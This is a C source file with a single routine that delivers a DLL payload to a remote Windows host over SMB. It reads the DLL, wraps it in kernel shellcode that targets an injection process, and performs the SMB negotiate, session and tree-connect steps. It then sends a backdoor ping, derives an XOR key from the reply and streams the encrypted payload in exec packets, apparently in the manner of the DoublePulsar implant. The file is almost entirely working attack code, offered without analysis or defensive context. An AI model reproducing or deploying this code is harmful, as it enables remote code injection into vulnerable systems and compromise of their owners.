#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > INT_MAX ? INT_MAX : (int)(length - sent);
        int result = send(sock, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }
    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > INT_MAX ? INT_MAX : (int)(length - received);
        int result = recv(sock, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }
    return 0;
}

static int upload_receive_smb_response(SOCKET sock, uint8_t **response, size_t *response_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *buffer;

    *response = NULL;
    *response_length = 0;

    if (upload_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if ((uint64_t)body_length + sizeof(header) > SIZE_MAX)
        return -1;

    buffer = (uint8_t *)malloc((size_t)body_length + sizeof(header));
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(sock, buffer + sizeof(header), body_length) != 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_length = (size_t)body_length + sizeof(header);
    return 0;
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    int wsa_started = 0;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    uint8_t *dll_data = NULL;
    uint8_t *payload = NULL;
    uint8_t *exec_packet = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    size_t exec_packet_capacity = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u +
                                  (size_t)SMB_EXEC_SHELLCODE_LEN;
    uint16_t user_id = 0;
    uint16_t tree_id = 0;
    uint32_t key = 0;
    int result = -1;
    int i;
    struct sockaddr_in address;
    LARGE_INTEGER file_size;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        goto cleanup;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > SIZE_MAX)
        goto cleanup;

    dll_size = (size_t)file_size.QuadPart;
    if (dll_size > UINT32_MAX ||
        (uint64_t)dll_size + (uint64_t)KERNEL_RUNDLL_SIZE > UINT32_MAX ||
        (uint64_t)dll_size + 3978u > UINT32_MAX)
        goto cleanup;

    dll_data = (uint8_t *)malloc(dll_size == 0 ? 1 : dll_size);
    if (dll_data == NULL)
        goto cleanup;

    {
        size_t offset = 0;
        while (offset < dll_size) {
            DWORD amount = dll_size - offset > MAXDWORD
                               ? MAXDWORD
                               : (DWORD)(dll_size - offset);
            DWORD bytes_read = 0;
            if (!ReadFile(file, dll_data + offset, amount, &bytes_read, NULL) ||
                bytes_read == 0)
                goto cleanup;
            offset += bytes_read;
        }
    }

    CloseHandle(file);
    file = INVALID_HANDLE_VALUE;

    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size == 0 || payload_size > UINT32_MAX ||
        (size_t)KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u)
        goto cleanup;

    payload = (uint8_t *)malloc(payload_size);
    if (payload == NULL)
        goto cleanup;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_size != 0)
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll_data, dll_size);

    {
        uint32_t value;
        size_t name_length = strlen((const char *)TARGET_INJECT_PROCESS);
        uint32_t hash = 0;
        const unsigned char *name =
            (const unsigned char *)TARGET_INJECT_PROCESS;

        value = (uint32_t)(dll_size + 3978u);
        payload[KERNEL_RUNDLL_TOTAL_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_TOTAL_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_TOTAL_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_TOTAL_OFFSET + 3] = (uint8_t)(value >> 24);

        value = (uint32_t)dll_size;
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 3] = (uint8_t)(value >> 24);

        value = 1;
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 3] = (uint8_t)(value >> 24);

        for (i = 0; (size_t)i < name_length; ++i)
            hash = hash * 127u + name[i];

        payload[KERNEL_RUNDLL_HASH_OFFSET] = (uint8_t)hash;
        payload[KERNEL_RUNDLL_HASH_OFFSET + 1] = (uint8_t)(hash >> 8);
        payload[KERNEL_RUNDLL_HASH_OFFSET + 2] = (uint8_t)(hash >> 16);
        payload[KERNEL_RUNDLL_HASH_OFFSET + 3] = (uint8_t)(hash >> 24);
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET ||
        connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    if (upload_send_all(sock, SMB_NEGOTIATE_PKT,
                        sizeof(SMB_NEGOTIATE_PKT) - 1u) != 0 ||
        upload_receive_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_send_all(sock, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1u) != 0 ||
        upload_receive_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length <= 33u)
        goto cleanup;
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    {
        uint8_t *tree_packet;
        size_t tree_packet_length = sizeof(SMB_TREE_CONNECT_PKT) - 1u;

        if (tree_packet_length < 34u)
            goto cleanup;
        tree_packet = (uint8_t *)malloc(tree_packet_length);
        if (tree_packet == NULL)
            goto cleanup;
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, tree_packet_length);
        tree_packet[32] = (uint8_t)user_id;
        tree_packet[33] = (uint8_t)(user_id >> 8);

        if (upload_send_all(sock, tree_packet, tree_packet_length) != 0 ||
            upload_receive_smb_response(sock, &response, &response_length) != 0) {
            free(tree_packet);
            goto cleanup;
        }
        free(tree_packet);
    }

    if (response_length <= 29u)
        goto cleanup;
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    {
        uint8_t ping_packet[sizeof(DP_PING_PKT) - 1u];

        if (sizeof(DP_PING_PKT) - 1u < 34u)
            goto cleanup;
        memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));
        ping_packet[28] = (uint8_t)tree_id;
        ping_packet[29] = (uint8_t)(tree_id >> 8);
        ping_packet[32] = (uint8_t)user_id;
        ping_packet[33] = (uint8_t)(user_id >> 8);

        if (upload_send_all(sock, ping_packet, sizeof(ping_packet)) != 0 ||
            upload_receive_smb_response(sock, &response, &response_length) != 0)
            goto cleanup;
    }

    if ((size_t)SMB_RESP_SIGNATURE_START + 4u > response_length)
        goto cleanup;

    {
        uint32_t sig =
            (uint32_t)response[SMB_RESP_SIGNATURE_START] |
            ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
            ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
            ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
        key = 2u * sig ^
              ((((sig >> 16) | (sig & 0x00FF0000u)) >> 8) |
               (((sig << 16) | (sig & 0x0000FF00u)) << 8));
    }
    free(response);
    response = NULL;

    xor_buffer(payload, payload_size, key);

    exec_packet = (uint8_t *)malloc(exec_packet_capacity);
    if (exec_packet == NULL)
        goto cleanup;

    {
        size_t offset = 0;
        while (offset < payload_size) {
            size_t chunk_size = payload_size - offset;
            size_t packet_length;
            uint32_t params[3];
            size_t parameter_index;
            uint8_t *parameters;

            if (chunk_size > (size_t)SMB_EXEC_SHELLCODE_LEN)
                chunk_size = (size_t)SMB_EXEC_SHELLCODE_LEN;
            packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u + chunk_size;

            memcpy(exec_packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
            parameters = exec_packet + (size_t)SMB_EXEC_TEMPLATE_LEN;

            params[0] = (uint32_t)payload_size;
            params[1] = (uint32_t)chunk_size;
            params[2] = (uint32_t)offset;

            for (parameter_index = 0; parameter_index < 12u; ++parameter_index) {
                uint8_t parameter_byte =
                    (uint8_t)(params[parameter_index / 4u] >>
                              ((parameter_index % 4u) * 8u));
                parameters[parameter_index] =
                    parameter_byte ^ (uint8_t)(key >> ((parameter_index % 4u) * 8u));
            }

            memcpy(exec_packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 12u,
                   payload + offset, chunk_size);

            {
                uint32_t netbios_length =
                    (uint32_t)(chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN + 12u - 4u);
                exec_packet[SMB_NETBIOS_LEN_OFFSET] =
                    (uint8_t)(netbios_length >> 16);
                exec_packet[SMB_NETBIOS_LEN_OFFSET + 1] =
                    (uint8_t)(netbios_length >> 8);
                exec_packet[SMB_NETBIOS_LEN_OFFSET + 2] =
                    (uint8_t)netbios_length;
            }

            exec_packet[SMB_EXEC_TOTAL_DATA_OFFSET] = (uint8_t)chunk_size;
            exec_packet[SMB_EXEC_TOTAL_DATA_OFFSET + 1] = (uint8_t)(chunk_size >> 8);
            exec_packet[SMB_EXEC_DATA_COUNT_OFFSET] = (uint8_t)chunk_size;
            exec_packet[SMB_EXEC_DATA_COUNT_OFFSET + 1] = (uint8_t)(chunk_size >> 8);

            {
                size_t byte_count = chunk_size + 12u;
                exec_packet[SMB_EXEC_BYTE_COUNT_OFFSET] = (uint8_t)byte_count;
                exec_packet[SMB_EXEC_BYTE_COUNT_OFFSET + 1] =
                    (uint8_t)(byte_count >> 8);
            }

            exec_packet[SMB_TID_OFFSET] = (uint8_t)tree_id;
            exec_packet[SMB_TID_OFFSET + 1] = (uint8_t)(tree_id >> 8);
            exec_packet[SMB_UID_OFFSET] = (uint8_t)user_id;
            exec_packet[SMB_UID_OFFSET + 1] = (uint8_t)(user_id >> 8);

            if (upload_send_all(sock, exec_packet, packet_length) != 0 ||
                upload_receive_smb_response(sock, &response, &response_length) != 0)
                goto cleanup;

            offset += chunk_size;
        }
    }

    if (response == NULL ||
        (size_t)DP_RESP_MUX_ID_OFFSET >= response_length ||
        response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC)
        goto cleanup;

    result = 0;

cleanup:
    if (response != NULL)
        free(response);
    if (exec_packet != NULL)
        free(exec_packet);
    if (payload != NULL)
        free(payload);
    if (dll_data != NULL)
        free(dll_data);
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();
    return result;
}